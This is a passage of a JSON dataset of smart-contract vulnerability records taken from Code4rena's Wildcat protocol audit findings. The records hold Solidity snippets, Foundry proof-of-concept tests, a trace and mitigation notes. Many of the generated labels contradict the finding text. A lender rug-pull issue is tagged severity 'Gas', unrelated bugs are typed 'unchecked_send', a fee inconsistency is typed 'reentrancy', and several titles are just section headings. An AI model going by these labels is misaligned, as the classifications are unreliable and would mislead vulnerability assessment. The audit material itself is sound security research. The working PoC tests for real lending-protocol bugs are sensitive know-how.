    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "state.normalizedUnclaimedRewards",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Although it's not a clean fix, consider adding a `addNormalizedUnclaimedRewards` function which can only be called after a market is closed. It takes token from the user and increases the global variable `state.normalizedUnclaimedRewards`. The invariant would remain broken, but it will make sure no funds are permanently stuck. **[laurenceday (Wildcat) confirmed and commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64#issuecomment-2388311632):** > We're going to have to dig into this, but we're confirming. Thank you! **[3docSec (judge) commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64#issuecomment-2391436961):** > I am confirming as High, under the assumption that funds can't be recovered (didn't see a `cancelWithdrawal` or similar option).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.032,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "pendingWithdrawalExpiry",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "Recommended Mitigation Steps",
    "description": "After closing a market and filling the current expiry, delete it from `pendingWithdrawalExpiry`. Introduce a `closedExpiry` variable so you later make sure a future expiry is not made at that same timestamp to avoid collision. **[d1ll0n (Wildcat) confirmed and commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/121#issuecomment-2403567138):** > Thanks for this, good find! Will adopt the proposed solution and see if it fixes [H-01](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64). **[laurenceday (Wildcat) commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/121#issuecomment-2406134173):** > Fixed with [wildcat-finance/v2-protocol@b25e528](https://github.com/wildcat-finance/v2-protocol/commit/b25e528420617504f1ae6393b4be281a967c3e41).",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/access/FixedTermLoanHooks.sol\n960:   function onSetAnnualInterestAndReserveRatioBips(\n961:     uint16 annualInterestBips,\n962:     uint16 reserveRatioBips,\n963:     MarketState calldata intermediateState,\n964:     bytes calldata hooksData\n965:   )\n966:     public\n967:     virtual\n968:     override\n969:     returns (uint16 updatedAnnualInterestBips, uint16 updatedReserveRatioBips)\n970:   {\n971:     return\n972:       super.onSetAnnualInterestAndReserveRatioBips(\n973:         annualInterestBips,\n974:         reserveRatioBips,\n975:         intermediateState,\n976:         hooksData\n977:       );\n978:   }\n979: \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Vulnerability details",
    "description": "In Wildcat markets, lenders know in advance how much `APR` the borrower will pay them. In order to allow lenders to exit the market swiftly, the market must always have at least a `reserve ratio` of the lender funds ready to be withdrawn. If the borrower decides to [reduce the `APR`](https://docs.wildcat.finance/using-wildcat/day-to-day-usage/borrowers#reducing-apr), in order to allow lenders to 'ragequit', a new `reserve ratio` is calculated based on the variation of the APR as described in the link above. Finally, is a market implement a fixed term (date until when withdrawals are not possible), it shouldn't be able to reduce the APR, as this would allow the borrower to 'rug' the lenders by reducing the APR to 0% while they couldn't do anything against that. The issue here is that while lenders are (as expected) prevented to withdraw before end of term:<br> <https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol#L857-L859>",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.632,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "FixedTermLoanHooks::onSetAnnualInterestAndReserveRatioBips",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Recommended Mitigation Steps",
    "description": "When `FixedTermLoanHooks::onSetAnnualInterestAndReserveRatioBips` is called, revert if `market.fixedTermEndTime > block.timestamp`. **[laurenceday (Wildcat) disputed and commented via duplicate issue \\#23](https://github.com/code-423n4/2024-08-wildcat-findings/issues/23#issuecomment-2368151696):** > This is a valid finding, thank you - an embarrassing one for us at that, we clearly just missed this when writing the hook templates! > > However, we're a bit torn internally on whether this truly classifies as a High. We've definitely specified in documentation that this is a rug pull mechanic, but there are no funds directly or indirectly at risk here, unless you classify the potential of _earning_ less than expected when you initially deposited as falling in that bucket.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.058,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function test_inconsistencyIssue() external {\n      parameters.annualInterestBips = 3650;\n      _deposit(alice, 1e18);\n      uint256 borrowAmount = market.borrowableAssets();\n      vm.prank(borrower);\n      market.borrow(borrowAmount);\n      vm.prank(alice);\n      market.queueFullWithdrawal();\n      fastForward(52 weeks);\n\n      asset.mint(borrower, 10e18);\n      vm.startPrank(borrower);\n      asset.approve(address(market), 10e18);\n      uint256 initBalance = asset.balanceOf(borrower); \n\n      asset.transfer(address(market), 10e18);\n      market.closeMarket();\n      uint256 finalBalance = asset.balanceOf(borrower);\n      uint256 paid = initBalance - finalBalance;\n      console.log(paid);\n\n  } \n\n    function test_inconsistencyIssue2() external {\n      parameters.annualInterestBips = 3650;\n      _deposit(alice, 1e18);\n      uint256 borrowAmount = market.borrowableAssets();\n      vm.prank(borrower);\n      market.borrow(borrowAmount);\n      vm.prank(alice);\n      market.queueFullWithdrawal();\n      fastForward(52 weeks);\n\n      asset.mint(borrower, 10e18);\n      vm.startPrank(borrower);\n      asset.approve(address(market), 10e18);\n      uint256 initBalance = asset.balanceOf(borrower); \n\n\n      market.closeMarket();\n      uint256 finalBalance = asset.balanceOf(borrower);\n      uint256 paid = initBalance - finalBalance;\n      console.log(paid);\n\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "[[M-03] Inconsistency across multiple repaying functions causing lender to pay extra fees](https://github.com/code-423n4/2024-08-wildcat-findings/issues/62)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/62), also found by [Bigsam](https://github.com/code-423n4/2024-08-wildcat-findings/issues/100), [0xNirix](https://github.com/code-423n4/2024-08-wildcat-findings/issues/96), [Udsen](https://github.com/code-423n4/2024-08-wildcat-findings/issues/72), [Takarez](https://github.com/code-423n4/2024-08-wildcat-findings/issues/47), and [Infect3d](https://github.com/code-423n4/2024-08-wildcat-findings/issues/73)* Within functions such as `repay` and `repayAndProcessUnpaidWithdrawalBatches`, funds are first pulled from the user in order to use them towards the currently expired, but not yet unpaid batch, and then the updated state is fetched. function repay(uint256 amount) external nonReentrant sphereXGuardExternal { if (amount == 0) revert_NullRepayAmount(); asset.safeTransferFrom(msg.sender, address(this), amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 47,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function onQueueWithdrawal(\n    address lender,\n    uint32 /* expiry */,\n    uint /* scaledAmount */,\n    MarketState calldata /* state */,\n    bytes calldata hooksData\n  ) external override {\n    HookedMarket memory market = _hookedMarkets[msg.sender];\n    if (!market.isHooked) revert NotHookedMarket();\n    if (market.fixedTermEndTime > block.timestamp) {\n      revert WithdrawBeforeTermEnd();\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[[M-04] `FixedTermLoanHook` looks at `block.timestamp` instead of `expiry`](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60)* The idea of `FixedTermLoanHook` is to only allow for withdrawals after a certain term end time. However, the problem is that the current implementation does not look at the expiry, but instead at the `block.timestamp`. function onQueueWithdrawal( address lender, uint32 /* expiry */,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.414,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "fixedTermEndTime = value - withdrawalBatchDuration",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Check the `expiry` instead of `block.timestamp`. **[d1ll0n (Wildcat) confirmed](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60#event-14486191444)** **[laurenceday (Wildcat) acknowledged and commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60#issuecomment-2403650325):** > We've reflected on this a little bit, and decided that we want to turn this from a confirmed into an acknowledge. >",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.05,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  /**\n   * @dev Grants a role to an account by updating the account's status.\n   *      Can only be called by an approved role provider.\n   *\n   *      If the account has an existing credential, it can only be updated if:\n   *      - the previous credential's provider is no longer supported, OR\n   *      - the caller is the previous role provider, OR\n   *      - the new expiry is later than the current expiry\n   */\n  function grantRole(address account, uint32 roleGrantedTimestamp) external {\n    RoleProvider callingProvider = _roleProviders[msg.sender];\n\n    if (callingProvider.isNull()) revert ProviderNotFound();\n\n    _grantRole(callingProvider, account, roleGrantedTimestamp);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[[M-05] Role providers can bypass intended restrictions and lower expiry set by other providers](https://github.com/code-423n4/2024-08-wildcat-findings/issues/57)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/57), also found by [0x1771](https://github.com/code-423n4/2024-08-wildcat-findings/issues/86) and [gesha17](https://github.com/code-423n4/2024-08-wildcat-findings/issues/10)* https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol#L413 If we look at the code comments, we'll see that role providers can update a user's credential only if at least one of the 3 is true: *   the previous credential's provider is no longer supported, OR *   the caller is the previous role provider, OR",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.7,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function test_closeMarket_BeforeFixedTermExpired() external {\n    //@audit-info deploy a FixedTermLoanHooks template\n    address fixedTermHookTemplate = LibStoredInitCode.deployInitCode(type(FixedTermLoanHooks).creationCode);\n    hooksFactory.addHooksTemplate(\n      fixedTermHookTemplate,\n      'FixedTermLoanHooks',\n      address(0),\n      address(0),\n      0,\n      0\n    );\n    \n    vm.startPrank(borrower);\n    //@audit-info borrower deploy a FixedTermLoanHooks hookInstance\n    address hooksInstance = hooksFactory.deployHooksInstance(fixedTermHookTemplate, '');\n    DeployMarketInputs memory parameters = DeployMarketInputs({\n      asset: address(asset),\n      namePrefix: 'name',\n      symbolPrefix: 'symbol',\n      maxTotalSupply: type(uint128).max,\n      annualInterestBips: 1000,\n      delinquencyFeeBips: 1000,\n      withdrawalBatchDuration: 10000,\n      reserveRatioBips: 10000,\n      delinquencyGracePeriod: 10000,\n      hooks: EmptyHooksConfig.setHooksAddress(address(hooksInstance))\n    });\n    //@audit-info borrower deploy a market hooked by a FixedTermLoanHooks hookInstance\n    address market = hooksFactory.deployMarket(\n      parameters,\n      abi.encode(block.timestamp + (365 days)),\n      bytes32(uint(1)),\n      address(0),\n      0\n    );\n    vm.stopPrank();\n    //@audit-info lenders can only withdraw their asset one year later\n    assertEq(FixedTermLoanHooks(hooksInstance).getHookedMarket(market).fixedTermEndTime, block.timestamp + (365 days));\n    //@audit-info alice deposit 50K asset into market\n    vm.startPrank(alice);\n    asset.approve(market, type(uint).max);\n    WildcatMarket(market).depositUpTo(50_000e18);\n    vm.stopPrank();\n    //@audit-info borrower close market in advance\n    vm.prank(borrower);\n    WildcatMarket(market).closeMarket();\n    //@audit-info the market is closed\n    assertTrue(WildcatMarket(market).isClosed());\n    //@audit-info however, alice can not withdraw her asset due to the unexpired fixed term.\n    vm.expectRevert(FixedTermLoanHooks.WithdrawBeforeTermEnd.selector);\n    vm.prank(alice);\n    WildcatMarket(market).queueFullWithdrawal();\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "[[M-06] No lender is able to exit even after the market is closed](https://github.com/code-423n4/2024-08-wildcat-findings/issues/52)",
    "description": "*Submitted by [0xpiken](https://github.com/code-423n4/2024-08-wildcat-findings/issues/52), also found by [josephxander](https://github.com/code-423n4/2024-08-wildcat-findings/issues/101) and [0xNirix](https://github.com/code-423n4/2024-08-wildcat-findings/issues/87)* When a borrower creates a market hooked by a [fixed-term hook](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol), all lenders are prohibited from withdrawing their assets from the market before the fixed-term time has elapsed. The borrower can close the market at any time. However, `fixedTermEndTime` of the market is not updated, preventing lenders from withdrawing their assets if `fixedTermEndTime` has not yet elapsed. Copy below codes to [WildcatMarket.t.sol](https://github.com/code-423n4/2024-08-wildcat/blob/main/test/market/WildcatMarket.t.sol) and run forge test --match-test test_closeMarket_BeforeFixedTermExpired: function test_closeMarket_BeforeFixedTermExpired() external {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 55,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n  constructor(address _deployer, bytes memory /* args */) IHooks() {\n    borrower = _deployer;\n    // Allow deployer to grant roles with no expiry\n    _roleProviders[_deployer] = encodeRoleProvider(\n      type(uint32).max,\n      _deployer,\n      NotPullProviderIndex\n    );\n    HooksConfig optionalFlags = encodeHooksConfig({\n      hooksAddress: address(0),\n      useOnDeposit: true,\n      useOnQueueWithdrawal: false,\n      useOnExecuteWithdrawal: false,\n      useOnTransfer: true,\n      useOnBorrow: false,\n      useOnRepay: false,\n      useOnCloseMarket: false,\n      useOnNukeFromOrbit: false,\n      useOnSetMaxTotalSupply: false,\n      useOnSetAnnualInterestAndReserveRatioBips: false,\n      useOnSetProtocolFeeBips: false\n    });\n    HooksConfig requiredFlags = EmptyHooksConfig\n      .setFlag(Bit_Enabled_SetAnnualInterestAndReserveRatioBips)\n+     .setFlag(Bit_Enabled_CloseMarket);\n      .setFlag(Bit_Enabled_QueueWithdrawal);\n    config = encodeHooksDeploymentConfig(optionalFlags, requiredFlags);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "When a market hooked by a fixed-term hook is closed, `fixedTermEndTime` should be set to `block.timestamp` if it has not yet elapsed: constructor(address _deployer, bytes memory /* args */) IHooks() { borrower = _deployer; // Allow deployer to grant roles with no expiry _roleProviders[_deployer] = encodeRoleProvider(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 30,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "powershell\nTraces:\n  [141487] AuditMarket::test_PoC_EOA_provider()\n    \u251c\u2500 [0] VM::startPrank(BORROWER1: [0xB193AC639A896a0B7a0B334a97f0095cD87427f2])\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [30181] AccessControlHooks::addRoleProvider(RoleProvider: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 2592000 [2.592e6])\n    \u2502   \u251c\u2500 [2275] RoleProvider::isPullProvider()\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] false\n    \u2502   \u251c\u2500 emit RoleProviderAdded(providerAddress: RoleProvider: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], timeToLive: 2592000 [2.592e6], pullProviderIndex: 16777215 [1.677e7])\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [74541] AccessControlHooks::addRoleProvider(RoleProvider: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 2592000 [2.592e6])\n    \u2502   \u251c\u2500 [2275] RoleProvider::isPullProvider()\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u251c\u2500 emit RoleProviderAdded(providerAddress: RoleProvider: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], timeToLive: 2592000 [2.592e6], pullProviderIndex: 0)\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [27653] AccessControlHooks::addRoleProvider(EOA_PROVIDER1: [0x6aAfF89c996cAa2BD28408f735Ba7A441276B03F], 2592000 [2.592e6])\n    \u2502   \u251c\u2500 [0] EOA_PROVIDER1::isPullProvider()\n    \u2502   \u2502   \u2514\u2500 \u2190 [Stop]\n    \u2502   \u251c\u2500 emit RoleProviderAdded(providerAddress: EOA_PROVIDER1: [0x6aAfF89c996cAa2BD28408f735Ba7A441276B03F], timeToLive: 2592000 [2.592e6], pullProviderIndex: 16777215 [1.677e7])\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u2514\u2500 \u2190 [Stop]\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Replace the interface call with a low-level call and check if the user implements the interface in order to be a pull provider: (bool succes, bytes memory data) = providerAddress.call(abi.encodeWithSelector(IRoleProvider.isPullProvider.selector)); bool isPullProvider; if (succes && data.length == 0x20) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nIf the caller is not a hooked market, the statement `!isKnownLenderOnMarket[lender][msg.sender]`, will return true, because the lender will be unknown. As a result the `_tryValidateAccess()` function will be executed for any `lender` and any `hooksData` passed. The call to [`_tryValidateAccess()`](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L698) will forward the call to [`_tryValidateAccessInner()`](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L654). Choosing a lender of arbitrary address, say `address(1)` will cause the function to attempt to retrieve the credential via the call to [\\_handleHooksData()](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L670), since the lender will have no previous provider or credentials.\n\nAs a result, the \\_handleHooksData function will forward the call to the encoded provider in the hooksData and will forward the extra hooks data as well, say merkle proof, or any arbitrary malicious data.\n\n<https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L617>\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "The `onQueueWithdrawal()` function does not check if the msg.sender is a hooked market, which is standart in virtually all other hooks: <https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L812> /** * @dev Called when a lender attempts to queue a withdrawal. *      Passes the check if the lender has previously deposited or received",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function enforceParameterConstraints(\n    uint16 annualInterestBips,\n    uint16 delinquencyFeeBips,\n    uint32 withdrawalBatchDuration,\n    uint16 reserveRatioBips,\n    uint32 delinquencyGracePeriod\n  ) internal view virtual {\n//snip\n    assertValueInRange(\n      reserveRatioBips,\n      MinimumReserveRatioBips,\n      MaximumReserveRatioBips,\n      ReserveRatioBipsOutOfBounds.selector\n    );\n    assertValueInRange(\n      delinquencyGracePeriod,\n      MinimumDelinquencyGracePeriod,\n      MaximumDelinquencyGracePeriod,\n      DelinquencyGracePeriodOutOfBounds.selector\n    );\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "First, note that the protocol allows borrowers to set a reserve ratio that they must maintain to avoid being charged a delinquency fee. Now, see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/MarketConstraintHooks.sol#L44-L45 uint16 internal constant MaximumReserveRatioBips = 10_000; From here we can see that the maximum acceptable value for this is `10_000`. Now when creating the market, this is called: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/MarketConstraintHooks.sol#L136-L150",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.594,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function collectFees() external nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n    if (state.accruedProtocolFees == 0) revert_NullFeeAmount();\n\n    uint128 withdrawableFees = state.withdrawableProtocolFees(totalAssets());\n    if (withdrawableFees == 0) revert_InsufficientReservesForFeeWithdrawal();\n\n    state.accruedProtocolFees -= withdrawableFees;\n    asset.safeTransfer(feeRecipient, withdrawableFees);\n    _writeState(state);\n    emit_FeesCollected(withdrawableFees);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "First, note that from the readMe, this has been stated: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L276 | [Blocklists](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#tokens-with-blocklists)                                                                | In scope    | Now, take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L125-L137 function collectFees() external nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.53,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "markdown\n| [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope    |\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "First, per the readMe, we should assume rebasing tokens are in scope, see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L262 | [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope    | Where as this integration is welcome as the WIldMarketTokens themselves are somewhat rebasing in nature, this then means that users could pay lesser APR, which is because if they are used as underlying assets for markets, when the borrower/market contracts hold these tokens while they are lent, the newly accrued tokens may either be credited to the borrower, or inside the market itself, which in our case would count as the borrower adding liquidity. And result in the borrower _needing_ to pay a lower Annual Percentage Rate (APR) than initially set.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.182,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function _getUpdatedState() internal returns (MarketState memory state) {\n    state = _state;\n    // Handle expired withdrawal batch\n    if (state.hasPendingExpiredBatch()) {\n      uint256 expiry = state.pendingWithdrawalExpiry;\n      // Only accrue interest if time has passed since last update.\n      // This will only be false if withdrawalBatchDuration is 0.\n      uint32 lastInterestAccruedTimestamp = state.lastInterestAccruedTimestamp;\n      if (expiry != lastInterestAccruedTimestamp) {\n        (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state\n          .updateScaleFactorAndFees(\n            delinquencyFeeBips,\n            delinquencyGracePeriod,\n            expiry\n          );\n          //snip\n      }\n          //snip\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L406-L465 function _getUpdatedState() internal returns (MarketState memory state) { state = _state; // Handle expired withdrawal batch if (state.hasPendingExpiredBatch()) {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.779,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function releaseEscrow() public override {\n    if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n    uint256 amount = balance();\n    address _account = account;\n    address _asset = asset;\n\n    asset.safeTransfer(_account, amount);\n\n    emit EscrowReleased(_account, _asset, amount);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatSanctionsEscrow.sol#L33-L44 function releaseEscrow() public override { if (!canReleaseEscrow()) revert CanNotReleaseEscrow(); uint256 amount = balance(); address _account = account;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.306,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function executeWithdrawal(\n    address accountAddress,\n    uint32 expiry\n  ) public nonReentrant sphereXGuardExternal returns (uint256) {\n    MarketState memory state = _getUpdatedState();\n    // Use an obfuscated constant for the base calldata size to prevent solc\n    // function specialization.\n    uint256 normalizedAmountWithdrawn = _executeWithdrawal(\n      state,\n      accountAddress,\n      expiry,\n      _runtimeConstant(0x44)\n    );\n    // Update stored state\n    _writeState(state);\n    return normalizedAmountWithdrawn;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Proof of Concept",
